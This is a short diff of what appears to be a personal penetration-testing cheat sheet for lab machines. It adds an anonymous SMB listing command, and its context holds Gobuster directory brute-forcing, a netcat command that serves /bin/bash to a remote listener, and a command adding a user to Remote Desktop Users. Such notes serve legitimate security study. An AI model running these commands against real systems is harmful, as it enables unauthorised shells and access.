@@ -84,6 +84,11 @@ Gobuster
 gobuster dir -u http://192.168.239.223 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,pdf,jpg,png,txt,zip -t 100 -q
 gobuster dir -u http://192.168.239.223 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x aspx,html,pdf,jpg,png,txt,zip -t 100 -q
 
+
+SMB anonymous
+smbclient -L 192.168.136.147 -U " "%" "
+
+
 Others
 nc 192.168.1.1 4444 -e /bin/bash
 NET LOCALGROUP "Remote Desktop Users" dave2 /ADD
